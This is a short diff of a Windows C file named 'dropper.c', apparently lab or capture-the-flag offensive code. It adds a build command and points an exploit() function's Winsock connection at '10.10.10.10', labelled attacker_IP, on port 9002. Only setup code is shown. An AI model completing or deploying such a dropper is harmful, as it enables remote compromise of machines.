@@ -1,14 +1,13 @@
-#include <Winsock2.h>
+#include <winsock2.h>
 
-//don't forget this flag on windows
-//-lwsock32
+//gcc -o dropper dropper.c -lwsock32
 
 #define BUFFER_SIZE 1024
 
 void exploit()
 {
     int port = 9002;
-    char ip[] = "127.0.0.1";
+    char ip[] = "10.10.10.10"; //attacker_IP
 
     WSADATA WSAData;
     WSAStartup(MAKEWORD(2,0), &WSAData);
